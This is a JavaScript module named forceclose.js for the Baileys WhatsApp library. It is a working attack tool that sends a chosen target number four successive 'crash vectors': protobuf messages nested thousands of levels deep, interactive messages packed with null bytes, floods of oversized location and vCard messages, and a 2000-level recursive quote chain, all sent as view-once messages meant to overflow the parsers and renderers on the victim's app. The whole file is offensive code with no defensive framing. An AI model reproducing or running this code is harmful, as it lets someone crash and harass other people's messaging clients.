// ==========================================
// forceclose.js — v2 AGGRESSIVE MULTI-VECTOR
// Tries 4 different crash vectors in sequence
// ==========================================
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
const crypto = require('crypto');

async function forceclose(sock, target) {
    if (!sock || !target) return;

    // Sender guard
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) return;
    } catch (_) {}

    // ==========================================
    // VECTOR 1: Deep LD chain (protobuf recursion)
    // Native parser stack overflow — version-agnostic
    // ==========================================
    async function vector1_LDChain() {
        try {
            const payload = proto.Message.encode(
                proto.Message.create({
                    extendedTextMessage: {
                        text: "D".repeat(1000),
                        contextInfo: {
                            quotedMessage: {
                                extendedTextMessage: {
                                    text: "D".repeat(1000),
                                    contextInfo: {
                                        quotedMessage: {
                                            extendedTextMessage: {
                                                text: "D".repeat(1000)
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                })
            ).finish();

            const encodeVarint = (n) => {
                const buf = [];
                while (n >= 0x80) { buf.push((n & 0x7f) | 0x80); n >>>= 7; }
                buf.push(n);
                return Buffer.from(buf);
            };
            const wrapLd = (tag, data) => Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
            const inflate = (tag, depth) => {
                let buf = payload;
                for (let i = 0; i < depth; i++) buf = wrapLd(tag, wrapLd([0x0A], buf));
                return buf;
            };

            const TAGS = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02], [0xC2, 0x05], [0xE2, 0x06]];
            for (const tag of TAGS) {
                let depthUsed = 0;
                for (let depth = 8000; depth >= 2000; depth -= 400) {
                    try {
                        const test = proto.Message.decode(inflate(tag, depth));
                        proto.Message.encode(test).finish();
                        depthUsed = depth;
                        break;
                    } catch (_) {}
                }
                if (!depthUsed) continue;

                for (let shot = 0; shot < 3; shot++) {
                    try {
                        const decoded = proto.Message.decode(inflate(tag, depthUsed));
                        const wrapped = { viewOnceMessage: { message: decoded } };
                        await sock.relayMessage(target, wrapped, {
                            messageId: '3EB0' + crypto.randomBytes(10).toString('HEX').toUpperCase(),
                        });
                    } catch (e) {}
                }
            }
        } catch (e) {
            console.log('[v1 LD]', e.message);
        }
    }

    // ==========================================
    // VECTOR 2: Interactive flow with null byte overflow
    // Hits old flow parser
    // ==========================================
    async function vector2_InteractiveOverflow() {
        try {
            const nullBlock = "\u0000".repeat(90000);
            const payload = {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "X",
                                hasMediaAttachment: false,
                            },
                            body: { text: nullBlock },
                            nativeFlowMessage: {
                                messageParamsJson: JSON.stringify({
                                    title: nullBlock.slice(0, 30000),
                                    sections: nullBlock.slice(0, 15000),
                                }),
                                buttons: [
                                    { name: "quick_reply", buttonParamsJson: nullBlock.slice(0, 25000) },
                                    { name: "call_permission_request", buttonParamsJson: nullBlock.slice(0, 12878) },
                                    { name: "single_select", buttonParamsJson: nullBlock.slice(0, 20000) },
                                    { name: "mpm", buttonParamsJson: nullBlock.slice(0, 15000) },
                                ],
                            },
                            contextInfo: {
                                mentionedJid: [target],
                                forwardingScore: 0x7FFFFFFF,
                                isForwarded: true,
                            },
                        },
                    },
                },
            };
            const msg = generateWAMessageFromContent(target, payload, {});
            await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
        } catch (e) {
            console.log('[v2 Interactive]', e.message);
        }
    }

    // ==========================================
    // VECTOR 3: Location + vCard flood
    // Hits native renderer
    // ==========================================
    async function vector3_LocationVcard() {
        try {
            const bigBlock = "𑇂𑆵𑆴𑆿".repeat(9000);
            const locationPayload = {
                viewOnceMessage: {
                    message: {
                        locationMessage: {
                            degreesLatitude: -999.999,
                            degreesLongitude: 999.999,
                            name: bigBlock,
                            address: "\u0000".repeat(50000),
                            url: "https://x.co/" + "\u200C".repeat(20000),
                            jpegThumbnail: Buffer.alloc(60000, 0xFF),
                            contextInfo: {
                                mentionedJid: [target],
                                forwardingScore: 0x7FFFFFFF,
                                isForwarded: true,
                            },
                        },
                    },
                },
            };
            const msgL = generateWAMessageFromContent(target, locationPayload, {});
            await sock.relayMessage(target, msgL.message, { messageId: msgL.key.id });

            // vCard flood
            let vcard = "";
            for (let i = 0; i < 200; i++) {
                vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${bigBlock.slice(0, 100)}\nTEL;waid=6280${i}:\nEND:VCARD\n`;
            }
            const vcardPayload = {
                viewOnceMessage: {
                    message: {
                        contactMessage: {
                            displayName: "X",
                            vcard: vcard,
                        },
                    },
                },
            };
            const msgV = generateWAMessageFromContent(target, vcardPayload, {});
            await sock.relayMessage(target, msgV.message, { messageId: msgV.key.id });
        } catch (e) {
            console.log('[v3 Location]', e.message);
        }
    }

    // ==========================================
    // VECTOR 4: Deep nested quote via JSON recursion
    // JSON parser stack overflow
    // ==========================================
    async function vector4_QuoteRecursion() {
        try {
            let q = { conversation: "\u0000" };
            for (let i = 0; i < 2000; i++) {
                q = {
                    extendedTextMessage: {
                        text: "\u0000" + "".padEnd(50, "\u200C"),
                        contextInfo: {
                            quotedMessage: q,
                            forwardingScore: 0x7FFFFFFF,
                            isForwarded: true,
                        },
                    },
                };
            }
            const payload = {
                viewOnceMessage: {
                    message: q,
                },
            };
            const msg = generateWAMessageFromContent(target, payload, {});
            await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
        } catch (e) {
            console.log('[v4 Quote]', e.message);
        }
    }

    // ==========================================
    // FIRE ALL VECTORS in sequence
    // ==========================================
    const vectors = [
        vector1_LDChain,
        vector2_InteractiveOverflow,
        vector3_LocationVcard,
        vector4_QuoteRecursion,
    ];

    for (const vec of vectors) {
        try {
            await vec();
            await new Promise(r => setTimeout(r, 1500));
        } catch (e) {
            console.log('[forceclose]', e.message);
        }
    }
}

module.exports = { forceclose };
